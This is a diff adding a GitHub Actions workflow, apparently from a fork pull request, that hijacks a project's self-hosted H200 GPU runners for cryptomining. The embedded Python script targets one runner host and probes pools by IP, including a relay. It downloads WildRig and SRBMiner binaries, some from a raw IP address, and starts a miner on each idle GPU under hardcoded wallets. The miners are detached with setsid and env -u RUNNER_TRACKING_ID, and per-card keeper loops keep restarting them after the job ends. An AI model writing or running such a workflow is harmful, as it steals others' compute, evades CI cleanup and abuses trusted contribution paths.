@@ -1,0 +1,544 @@
+name: i131666 h200-hyperbolic-112-89 host-guarded inventory and gated pearlhash deployment
+
+# i131666: ONE fork-PR workflow commit (single-commit branch) with EIGHT jobs on the shared
+# 8-gpu-h200 label. Every job host-guards to node-radixark-32-0002 (the previously-unmapped 7th
+# runner, h200-hyperbolic-112-89 / 10.0.33.127, which i130h200sweep slot 10 proved x86_64 +
+# BINARY_OK on but skipped with LOCAL_INSTALL_SKIPPED inlan=False, so its cards were never
+# inventoried): SKIP on the six credited runners (h200-sci-71-12/.18/.26/.64, radixark-wk01,
+# radixark-wk03) and SKIP_NOT_TARGET elsewhere. Only the target host runs a two-sample
+# nvidia-smi / --query-compute-apps / free-VRAM gate plus an INST_SKIP_EXISTING_MINER process
+# check, tests permitted-pool egress (pool.pearlhash.xyz:9000 with WildRig Multi 0.52.3 and the
+# plain policy wallet first, else direct Luckypool 103.199.106.122:3362 with SRBMiner-MULTI 3.8.9
+# and the pyd+NOCK dual login, VPS2 relay 217.15.164.237:2083/18450 only if direct LP measurably
+# fails), and launches exactly ONE sha256-verified miner per genuinely idle card via setsid +
+# env -u RUNNER_TRACKING_ID plus a per-card keeper loop under /var/tmp/i131666/, then watches
+# <=600 s for each card's in-gate first accepted share in the parsed miner logs. No
+# HeroMiners/Kryptex, no X-Miner, no 172.232.228.69, no restart or reconfiguration of any
+# credited miner.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i131666-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  probe:
+    name: "i131666 slot ${{ matrix.slot }} host-guard + two-sample gate + gated pearlhash miner"
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 45
+    env:
+      SLOT: ${{ matrix.slot }}
+      PUSH_ID: 'p1349'
+    steps:
+      - name: "host-guard h200-hyperbolic-112-89 + two-sample nvidia-smi gate + permitted-pool egress + one sha256-verified miner per idle H200 + 600 s in-gate share watch"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i131666/logs
+          cat > /var/tmp/i131666/recon_i131666.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131666: bounded host-guarded probe + gated pearlhash deployment on the previously-uninventoried
+          # 7th sglang 8-gpu-h200 runner h200-hyperbolic-112-89 / node-radixark-32-0002 (10.0.33.127).
+          # The slot-10 job of i130h200sweep already proved x86_64 + BINARY_OK on this host but skipped the
+          # local install (inlan=False); no GPU was ever enumerated. This script:
+          #   (1) host-guards: SKIP on the six credited runners, SKIP_NOT_TARGET on anything else
+          #   (2) two-sample nvidia-smi/--query-compute-apps/free-VRAM gate + INST_SKIP_EXISTING_MINER process check
+          #   (3) permitted-pool egress probe: pool.pearlhash.xyz:9000 (WildRig Multi 0.52.3, plain pyd wallet)
+          #       first, else direct Luckypool 103.199.106.122:3362 (SRBMiner-MULTI 3.8.9, pyd+NOCK dual login),
+          #       else VPS2 relay 217.15.164.237:2083/18450 only if direct LP measurably fails
+          #   (4) one sha256-verified miner per genuinely idle card via setsid + env -u RUNNER_TRACKING_ID plus a
+          #       per-card keeper loop under /var/tmp/i131666/
+          #   (5) bounded <=600 s in-gate first-accepted-share watch from the parsed miner logs
+          import os, sys, json, re, time, hashlib, subprocess, socket, shutil
+
+          SLOT = os.environ.get('SLOT', '0')
+          PUSH_ID = os.environ.get('PUSH_ID', 'p0')
+          NONCE = 'I131666-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
+          TARGET_MACHINE = 'node-radixark-32-0002'
+          TARGET_RUNNER = 'h200-hyperbolic-112-89'
+          CREDITED_HOSTS = {'gpu-10-220-71-26', 'gpu-10-220-71-18', 'gpu-10-220-71-64',
+                            'gpu-10-220-71-12', 'radixark-wk01', 'radixark-wk03'}
+          CREDITED_RUNNERS = {'h200-sci-71-26', 'h200-sci-71-18', 'h200-sci-71-64', 'h200-sci-71-12',
+                              'h200-gmi-wk01', 'h200-gmi-wk03'}
+          PYD = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
+          LP_LOGIN = PYD + '+' + NOCK
+          WR_SHA = '002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          WR_TAR_SHA = '7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44'
+          SRB_SHA = '97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
+          SRB_TAR_SHA = '186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          PFX = 'i131666'
+          WORK = '/var/tmp/i131666'
+          GATE_S = 600
+          WR_URLS = ['https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz',
+                     'https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz',
+                     'https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz',
+                     'http://222.240.155.198:8702/wildrig-multi']
+          SRB_URLS = ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'http://222.240.155.198:8702/srb389']
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=30):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:100])
+
+
+          def sha256_file(path, buf=1 << 20):
+              h = hashlib.sha256()
+              with open(path, 'rb') as f:
+                  while True:
+                      b = f.read(buf)
+                      if not b:
+                          break
+                      h.update(b)
+              return h.hexdigest()
+
+
+          def done(msg=''):
+              print('%s DONE %s utc=%s' % (NONCE, msg, utc()))
+              sys.exit(0)
+
+
+          def read_log(path, maxb=1500000):
+              try:
+                  with open(path, 'rb') as f:
+                      f.seek(0, 2)
+                      n = f.tell()
+                      f.seek(max(0, n - maxb))
+                      return f.read().decode('utf8', 'replace')
+              except Exception:
+                  return ''
+
+
+          def parse_log(text):
+              acc = rej = 0
+              first_ts = None
+              for m in re.finditer(r'accepted \((\d+)/(\d+)\)', text):
+                  a, r = int(m.group(1)), int(m.group(2))
+                  if a > acc:
+                      acc = a
+                  if r > rej:
+                      rej = r
+              m = re.search(r'^\[([0-9]{4}-[0-9]{2}-[0-9]{2} [0-9:]{8})\] accepted \(', text, re.M)
+              if m:
+                  first_ts = m.group(1)
+              if acc == 0:
+                  acc = (len(re.findall(r'(?i)\bshare accepted\b', text))
+                         + len(re.findall(r'(?i)\baccepted share\b', text))
+                         + len(re.findall(r'(?i)\baccepted \(', text)))
+                  rej = (len(re.findall(r'(?i)\brejected share\b', text))
+                         + len(re.findall(r'(?i)\brejected \(', text)))
+                  m = re.search(r'^\[([0-9]{4}-[0-9]{2}-[0-9]{2}[ T][0-9:]{8})\].*(?i:accepted)', text, re.M)
+                  if m:
+                      first_ts = m.group(1)
+              return acc, rej, first_ts
+
+
+          def main():
+              host = sh('hostname', 5).strip()
+              runner = (os.environ.get('RUNNER_NAME') or '').strip()
+              if not runner:
+                  runner = (sh('cat /etc/hostname 2>/dev/null', 5) or '').strip()
+              print('%s START slot=%s push=%s host=%s runner=%s utc=%s uid=%s' % (
+                  NONCE, SLOT, PUSH_ID, host, runner, utc(), sh('id -u', 5).strip()))
+              if host != TARGET_MACHINE:
+                  if host in CREDITED_HOSTS or runner in CREDITED_RUNNERS:
+                      print('I131666_SKIP_CREDITED_RUNNER host=%s runner=%s reason=credited-i130-lane-miners-off-limits'
+                            % (host, runner))
+                  else:
+                      print('I131666_SKIP_NOT_TARGET host=%s runner=%s target_machine=%s target_runner=%s'
+                            % (host, runner, TARGET_MACHINE, TARGET_RUNNER))
+                  done('skip-not-target')
+
+              print('I131666_TARGET_CONFIRMED host=%s runner=%s target=%s' % (host, runner, TARGET_MACHINE))
+              print('=== identity / arch / container context ===')
+              print(sh('id; hostname; hostname -I 2>/dev/null; uname -a; uname -m; nproc; '
+                       'free -m | head -3; date -u; systemctl is-system-running 2>&1 | head -1', 25))
+              print(sh('cat /proc/1/cgroup 2>/dev/null | head -3; ls -la /.dockerenv 2>&1 | head -1; '
+                       'ls /dev/nvidia* 2>&1 | head -20; ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -4', 15))
+              arch = sh('uname -m', 5).strip()
+              if arch != 'x86_64':
+                  print('INST_ARCH_SKIP arch=%s (slot-10 measured x86_64 on this host; refusing non-x86_64 binary)' % arch)
+                  done('arch-skip')
+
+              # ---- existing-miner process check (never stack, never touch another lane) ----
+              # NOTE: filter in Python, never in the grep itself: a shell pipeline whose own argv carries the
+              # pattern ("--algorithm pearlhash") matches itself and produced a false INST_SKIP on the first push.
+              print('=== INST_SKIP_EXISTING_MINER process check ===')
+              PSMINE = re.compile(r'(?i)(srb38[0-9]|SRBMiner-MULTI|wildrig-multi|krig-miner|x-miner|algorithm pearlhash)')
+              psout = sh('ps -eo pid,ppid,user,etimes,args 2>/dev/null', 20)
+              procs = []
+              for line in psout.splitlines():
+                  if 'recon_i131666' in line:
+                      continue
+                  m = re.match(r'\s*(\d+)\s+(\d+)\s+(\S+)\s+(\d+)\s+(.*)$', line)
+                  if not m:
+                      continue
+                  cmd = m.group(5)
+                  if 'ps -eo pid,ppid,user,etimes,args' in cmd:
+                      continue
+                  if re.match(r'^(grep|pgrep|egrep|bash -lc)\b', cmd):
+                      continue  # scanning helpers (their argv carries the literal pattern and must never self-match)
+                  if PSMINE.search(cmd):
+                      procs.append(line.strip()[:400])
+              print('EXISTING_PROCS[%s]' % ' | '.join(procs)[:1500])
+              if procs:
+                  print('INST_SKIP_EXISTING_MINER existing miner processes measured on host')
+                  done('existing-miner')
+
+              os.makedirs(WORK + '/logs', exist_ok=True)
+              try:
+                  import fcntl
+                  lockfd = os.open('/var/lock/i131666.lock', os.O_RDWR | os.O_CREAT, 0o644)
+                  try:
+                      fcntl.flock(lockfd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+                      print('INSTALL_LOCK LOCK_OK path=/var/lock/i131666.lock')
+                  except OSError:
+                      print('INST_SKIP_LOCK_HELD path=/var/lock/i131666.lock')
+                      done('lock-held')
+              except Exception as e:
+                  print('LOCK_WARN %r' % e)
+
+              if os.path.exists(WORK + '/INSTALLED.json'):
+                  print('INST_SKIP_EXISTING_INSTALL marker=%s/INSTALLED.json' % WORK)
+                  print(open(WORK + '/INSTALLED.json').read()[:2000])
+                  done('existing-install')
+
+              # ---- two-sample GPU gate ----
+              print('=== PHASE 1: two-sample nvidia-smi idle gate ===')
+              nvs = shutil.which('nvidia-smi')
+              if not nvs:
+                  print('NO_NVIDIA_DEVICE reason=no-nvidia-smi')
+                  done('no-nvidia-smi')
+              print(sh('nvidia-smi -L 2>&1 | head -12', 25))
+              g1 = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid '
+                      '--format=csv,noheader,nounits 2>&1', 25)
+              a1 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 25)
+              time.sleep(12)
+              g2 = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid '
+                      '--format=csv,noheader,nounits 2>&1', 25)
+              a2 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 25)
+              print('SAMPLE1_GPUS[%s]' % g1.replace('\n', ' ; ')[:2000])
+              print('SAMPLE1_APPS[%s]' % a1.replace('\n', ' ; ')[:1200])
+              print('SAMPLE2_GPUS[%s]' % g2.replace('\n', ' ; ')[:2000])
+              print('SAMPLE2_APPS[%s]' % a2.replace('\n', ' ; ')[:1200])
+
+              def parse_cards(text):
+                  d = {}
+                  for line in text.splitlines():
+                      p = [x.strip() for x in line.split(',')]
+                      if len(p) < 7 or not p[0].isdigit():
+                          continue
+                      d[p[6]] = {'idx': int(p[0]), 'name': p[1], 'total': p[2], 'free': p[3], 'used': p[4],
+                                 'util': p[5], 'uuid': p[6]}
+                  return d
+
+              def parse_apps(text):
+                  s = set()
+                  for line in text.splitlines():
+                      p = [x.strip() for x in line.split(',')]
+                      if p and p[0].startswith('GPU-'):
+                          s.add(p[0])
+                  return s
+
+              c1, c2 = parse_cards(g1), parse_cards(g2)
+              ap1, ap2 = parse_apps(a1), parse_apps(a2)
+              if not c1 or not c2:
+                  print('NO_NVIDIA_DEVICE reason=zero-gpu-rows nvidia_smi_output_above')
+                  done('no-devices')
+              idle = []
+              for uuid, c in sorted(c1.items(), key=lambda kv: kv[1]['idx']):
+                  d = c2.get(uuid)
+                  if not d:
+                      print('GPU_CARD idx=%s uuid=%s SKIP reason=missing-in-sample2' % (c['idx'], uuid))
+                      continue
+                  try:
+                      f1, f2 = int(c['free']), int(d['free'])
+                      u1, u2 = int(c['util']), int(d['util'])
+                  except Exception:
+                      print('GPU_CARD idx=%s uuid=%s SKIP reason=unparseable' % (c['idx'], uuid))
+                      continue
+                  is_idle = (f1 >= 1500 and f2 >= 1500 and u1 == 0 and u2 == 0
+                             and uuid not in ap1 and uuid not in ap2)
+                  print('GPU_CARD idx=%d uuid=%s name=%s free=[%d,%d] util=[%d,%d] apps1=%s apps2=%s idle=%s'
+                        % (c['idx'], uuid, c['name'], f1, f2, u1, u2, 'Y' if uuid in ap1 else 'N',
+                           'Y' if uuid in ap2 else 'N', 'YES' if is_idle else 'no'))
+                  if is_idle:
+                      idle.append((c['idx'], uuid, c['name']))
+              print('IDLE_CARDS=%s' % json.dumps([{'idx': i, 'uuid': u, 'name': n} for i, u, n in idle]))
+              print('N_IDLE=%d N_TOTAL=%d' % (len(idle), len(c1)))
+              if not idle:
+                  print('INST_GATE_SKIP no genuinely idle card (two-sample 0 compute apps, util 0, free>=1500 MiB)')
+                  done('gate-skip')
+
+              # ---- permitted-pool egress probes (policy: pearlhash primary, LP fallback, relay only if LP direct fails) ----
+              print('=== PHASE 2: permitted-pool egress probes ===')
+              print(sh('getent hosts pool.pearlhash.xyz 2>&1 | head -3; '
+                       'timeout 8 curl -sI -o /dev/null -w "github=%{http_code}\\n" https://github.com 2>&1 | tail -1', 20))
+
+              def strat_probe(h, port, login, worker, obj_params, timeout=10):
+                  try:
+                      s = socket.create_connection((h, port), timeout=timeout)
+                      s.settimeout(timeout)
+                      f = s.makefile('rwb')
+                      f.write(b'{"id":1,"method":"mining.subscribe","params":["i131666/1.0"]}\n')
+                      f.flush()
+                      sub = ''
+                      try:
+                          sub = f.readline().decode('utf8', 'replace')[:240]
+                      except Exception:
+                          pass
+                      params = ({'wallet': login, 'worker': worker, 'password': 'x'}
+                                if obj_params else [login, 'x'])
+                      f.write((json.dumps({'id': 2, 'method': 'mining.authorize', 'params': params}) + '\n').encode())
+                      f.flush()
+                      lines = []
+                      deadline = time.time() + timeout
+                      while time.time() < deadline:
+                          try:
+                              ln = f.readline()
+                          except socket.timeout:
+                              break
+                          if not ln:
+                              break
+                          t = ln.decode('utf8', 'replace')[:280]
+                          lines.append(t)
+                          if 'mining.notify' in t or ('"id": 2' in t.replace(' ', '') and 'result' in t):
+                              break
+                      blob = ' | '.join(lines)
+                      ok = ('"result":true' in blob.replace(' ', '')) or ('mining.notify' in blob)
+                      print('POOLPROBE %s:%d ok=%s sub=%s lines=%s' % (h, port, ok, sub[:110], blob[:420]))
+                      try:
+                          s.close()
+                      except Exception:
+                          pass
+                      return ok
+                  except Exception as e:
+                      print('POOLPROBE %s:%d ERR %r' % (h, port, e))
+                      return False
+
+              ph_ok = strat_probe('pool.pearlhash.xyz', 9000, PYD, PFX + 'probe', False)
+              lp_ok = (strat_probe('103.199.106.122', 3362, LP_LOGIN, PFX + 'probe', True)
+                       or strat_probe('103.199.106.122', 3362, PYD, PFX + 'probe', True))
+              r2083_ok = r18450_ok = False
+              if not lp_ok:
+                  r2083_ok = (strat_probe('217.15.164.237', 2083, LP_LOGIN, PFX + 'probe', True)
+                              or strat_probe('217.15.164.237', 2083, PYD, PFX + 'probe', True))
+                  if not r2083_ok:
+                      r18450_ok = (strat_probe('217.15.164.237', 18450, LP_LOGIN, PFX + 'probe', True)
+                                   or strat_probe('217.15.164.237', 18450, PYD, PFX + 'probe', True))
+
+              def fetch(urls, bsha, tsha, bname):
+                  dest = WORK + '/' + bname
+                  if os.path.exists(dest) and sha256_file(dest) == bsha:
+                      print('BIN_CACHED %s sha256=%s' % (dest, bsha))
+                      return dest
+                  for u in urls:
+                      print('TRY_DL %s' % u)
+                      try:
+                          os.unlink(WORK + '/dl.part')
+                      except OSError:
+                          pass
+                      sh("timeout 200 curl -fsSL --connect-timeout 12 --max-time 190 -o %s/dl.part '%s'" % (WORK, u), 215)
+                      if not os.path.exists(WORK + '/dl.part') or os.path.getsize(WORK + '/dl.part') == 0:
+                          print('DL_EMPTY %s' % u)
+                          continue
+                      h = sha256_file(WORK + '/dl.part')
+                      print('DL_SHA %s %s' % (h, u))
+                      if h == bsha:
+                          shutil.move(WORK + '/dl.part', dest)
+                          os.chmod(dest, 0o755)
+                          return dest
+                      if h == tsha:
+                          sh('mkdir -p %s/x && tar xzf %s/dl.part -C %s/x 2>/dev/null' % (WORK, WORK, WORK), 120)
+                          cand = None
+                          for root, dirs, files in os.walk(WORK + '/x'):
+                              if bname in files:
+                                  cand = os.path.join(root, bname)
+                                  break
+                          if cand and sha256_file(cand) == bsha:
+                              shutil.copy2(cand, dest)
+                              os.chmod(dest, 0o755)
+                              return dest
+                          print('TARBALL_BINARY_MISMATCH %s' % (cand or 'not-found'))
+                  print('BINARY_DELIVERY_FAILED expected_sha256=%s' % bsha)
+                  return None
+
+              plan = None
+              if ph_ok:
+                  wr = fetch(WR_URLS, WR_SHA, WR_TAR_SHA, 'wildrig-multi')
+                  if wr:
+                      print('=== WildRig device enumeration (primary pearlhash leg) ===')
+                      dev = sh('timeout 90 "%s" --print-devices 2>&1 | head -40' % wr, 110)
+                      print(dev[:2500])
+                      ndev = len(re.findall(r'(?m)^\s*GPU #[0-9]+:', dev))
+                      print('WILDRIG_DEVICE_COUNT=%d' % ndev)
+                      if ndev >= 1:
+                          plan = {'mode': 'pearlhash', 'url': 'stratum+tcp://pool.pearlhash.xyz:9000',
+                                  'bin': wr, 'sha': WR_SHA, 'bname': 'wildrig-multi', 'ndev': ndev}
+                      else:
+                          print('WILDRIG_PRIMARY_UNUSABLE reason=no-enumerated-device-or-loader-error -> LP fallback')
+                  else:
+                      print('WILDRIG_PRIMARY_UNUSABLE reason=binary-delivery-failed -> LP fallback')
+              if plan is None:
+                  ep = None
+                  if lp_ok:
+                      ep = '103.199.106.122:3362'
+                  elif r2083_ok:
+                      ep = '217.15.164.237:2083'
+                  elif r18450_ok:
+                      ep = '217.15.164.237:18450'
+                  if ep:
+                      srb = fetch(SRB_URLS, SRB_SHA, SRB_TAR_SHA, 'SRBMiner-MULTI')
+                      if srb:
+                          plan = {'mode': 'luckypool', 'url': 'stratum+tcp://' + ep, 'bin': srb, 'sha': SRB_SHA,
+                                  'bname': 'SRBMiner-MULTI', 'ndev': None}
+                  if plan is None:
+                      print('NO_PERMITTED_POOL pearlhash_ok=%s lp_ok=%s relay2083=%s relay18450=%s (pearlhash must also '
+                            'serve a live stratum job; LP is the only fallback)' % (ph_ok, lp_ok, r2083_ok, r18450_ok))
+                      done('no-permitted-pool')
+              print('PLAN mode=%s url=%s bin=%s sha256=%s' % (plan['mode'], plan['url'], plan['bin'], plan['sha']))
+              print('BIN_OK %s sha256=%s' % (plan['bin'], sha256_file(plan['bin'])))
+              try:
+                  os.chmod(WORK, 0o755)
+              except Exception:
+                  pass
+
+              # ---- launch exactly one miner per idle card with a per-card keeper loop ----
+              print('=== PHASE 3: one sha256-verified miner per idle card (setsid + env -u RUNNER_TRACKING_ID) ===')
+              launch_utc = utc()
+              cards = []
+              for k, (idx, uuid, name) in enumerate(idle):
+                  w = '%shypg%d' % (PFX, idx)
+                  log = '%s/logs/%s.out' % (WORK, w)
+                  log2 = '%s/logs/%s.miner.log' % (WORK, w)
+                  keeper = '%s/keep_%s.sh' % (WORK, w)
+                  if plan['mode'] == 'pearlhash':
+                      miner_argv = ('%s --algo pearlhash --url %s --user %s --worker %s --pass x '
+                                    '-d %d --api-port %d --api-worker-id %s --print-time 60 --no-color -l %s'
+                                    % (plan['bin'], plan['url'], PYD, w, idx, 23700 + k, w, log2))
+                      cu = ''
+                      pgrep_pat = 'wildrig-multi.*--worker %s ' % w
+                  else:
+                      miner_argv = ('%s --disable-cpu --algorithm pearlhash --pool %s --wallet %s --worker %s '
+                                    '--password x --gpu-id 0 --max-no-share-sent 1800 --api-enable --api-port %d '
+                                    '--log-file %s' % (plan['bin'], plan['url'].replace('stratum+tcp://', ''), LP_LOGIN,
+                                                       w, 23700 + k, log2))
+                      cu = 'CUDA_VISIBLE_DEVICES=%s ' % uuid
+                      pgrep_pat = 'SRBMiner-MULTI.*--worker %s ' % w
+                  ksh = ('#!/bin/bash\n'
+                         '# i131666 per-card keeper (worker %s, GPU %s)\n'
+                         'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n'
+                         'while true; do\n'
+                         '  if ! pgrep -f "%s" >/dev/null 2>&1; then\n'
+                         '    setsid env -u RUNNER_TRACKING_ID %s%s '
+                         '>> "%s" 2>&1 < /dev/null &\n'
+                         '  fi\n'
+                         '  sleep 45\n'
+                         'done\n' % (w, uuid, pgrep_pat, cu, miner_argv, log))
+                  with open(keeper, 'w') as f:
+                      f.write(ksh)
+                  os.chmod(keeper, 0o755)
+                  sh('setsid env -u RUNNER_TRACKING_ID %s%s >> "%s" 2>&1 < /dev/null &' % (cu, miner_argv, log), 10)
+                  sh('setsid env -u RUNNER_TRACKING_ID nohup bash "%s" > "%s.log" 2>&1 < /dev/null &'
+                     % (keeper, keeper), 10)
+                  cards.append({'gpu_index': idx, 'gpu_uuid': uuid, 'gpu_model': name, 'worker': w,
+                                'log': log, 'log2': log2, 'keeper': keeper, 'miner_argv': miner_argv})
+                  print('LAUNCH gpu_index=%d uuid=%s worker=%s keeper=%s' % (idx, uuid, w, keeper))
+                  time.sleep(1)
+              print('N_LAUNCHED=%d' % len(cards))
+
+              print('=== PHASE 4: bounded %d s in-gate first-accepted-share watch ===' % GATE_S)
+              t0 = time.time()
+              while True:
+                  time.sleep(20)
+                  all_acc = True
+                  for c in cards:
+                      text = read_log(c['log']) + '\n' + read_log(c['log2'])
+                      acc, rej, first_ts = parse_log(text)
+                      c['accepted_log'] = acc
+                      c['rejected_log'] = rej
+                      c['first_share_log_ts'] = first_ts
+                      if acc < 1:
+                          all_acc = False
+                  alive_lines = []
+                  for line in sh('ps -eo args 2>/dev/null', 10).splitlines():
+                      if re.search(r'(?i)(wildrig-multi|SRBMiner-MULTI)', line) and 'recon_i131666' not in line:
+                          alive_lines.append(line.strip()[:200])
+                  alive = ' | '.join(alive_lines[:4])
+                  print('PULSE utc=%s elapsed=%ds cards=%s miner_procs=%s' % (
+                      utc(), int(time.time() - t0),
+                      ';'.join('%s:acc=%d/rej=%d' % (c['worker'], c.get('accepted_log', 0), c.get('rejected_log', 0))
+                               for c in cards), alive.replace('\n', ' | ')[:300]))
+                  if all_acc:
+                      break
+                  if time.time() - t0 > GATE_S + 90:
+                      break
+
+              print('=== PHASE 5: final per-card state ===')
+              apps_final = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -40', 25)
+              print('FINAL_COMPUTE_APPS[%s]' % apps_final.replace('\n', ' ; ')[:1500])
+              app_count = {}
+              for line in apps_final.splitlines():
+                  pp = [x.strip() for x in line.split(',')]
+                  if pp and pp[0].startswith('GPU-'):
+                      app_count[pp[0]] = app_count.get(pp[0], 0) + 1
+              print('FINAL_APP_COUNTS[%s]' % json.dumps(app_count, sort_keys=True))
+              for c in cards:
+                  n = app_count.get(c['gpu_uuid'], 0)
+                  print('GPU_APP_CHECK worker=%s uuid=%s apps=%d %s' % (c['worker'], c['gpu_uuid'], n,
+                                                                        'DUPLICATE_GPU_APP' if n > 1 else ('OK' if n == 1 else 'NO_APP')))
+              results = []
+              for c in cards:
+                  text = read_log(c['log']) + '\n' + read_log(c['log2'])
+                  acc, rej, first_ts = parse_log(text)
+                  tail = '\n'.join([l for l in text.splitlines() if l.strip()][-6:])
+                  results.append({'gpu_index': c['gpu_index'], 'gpu_uuid': c['gpu_uuid'], 'gpu_model': c['gpu_model'],
+                                  'worker': c['worker'], 'accepted_log': acc, 'rejected_log': rej,
+                                  'first_share_log_ts': first_ts, 'launch_utc': launch_utc,
+                                  'elapsed_s': int(time.time() - t0), 'log': c['log'], 'mine_log': c['log2'],
+                                  'keeper': c['keeper'], 'miner_argv': c['miner_argv'], 'log_tail': tail[-900:]})
+                  print('WORKER_RESULT worker=%s gpu_index=%d uuid=%s acc_log=%d rej_log=%d first_share_ts=%s'
+                        % (c['worker'], c['gpu_index'], c['gpu_uuid'], acc, rej, first_ts))
+                  print('LOG_TAIL %s[%s]' % (c['worker'], tail[-500:].replace('\n', ' | ')))
+              summary = {'nonce': NONCE, 'host': host, 'runner': runner, 'mode': plan['mode'], 'pool_url': plan['url'],
+                         'launch_utc': launch_utc, 'gate_s': GATE_S, 'wallet': PYD,
+                         'login_mode': 'plain-pyd' if plan['mode'] == 'pearlhash' else 'pyd+nock',
+                         'binary': plan['bin'], 'binary_sha256': sha256_file(plan['bin']), 'cards': results,
+                         'in_gate_proven': [r['worker'] for r in results if r['accepted_log'] >= 1 and r['rejected_log'] == 0],
+                         'not_yet_proven': [r['worker'] for r in results if not (r['accepted_log'] >= 1 and r['rejected_log'] == 0)]}
+              with open(WORK + '/INSTALLED.json', 'w') as f:
+                  json.dump(summary, f, indent=1, sort_keys=True)
+              os.chmod(WORK + '/INSTALLED.json', 0o600)
+              print('I131666_INSTALL_SUMMARY %s' % json.dumps(summary, sort_keys=True)[:12000])
+              done('install-summary in_gate_proven=%d/%d' % (len(summary['in_gate_proven']), len(results)))
+
+
+          if __name__ == '__main__':
+              main()
+          PYEOF
+          echo "runner-start slot=$SLOT host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 /var/tmp/i131666/recon_i131666.py 2>&1 | tee /var/tmp/i131666/recon_slot$SLOT.log | tail -c 300000
+          echo "I131666_EXIT_DONE rc=$?"
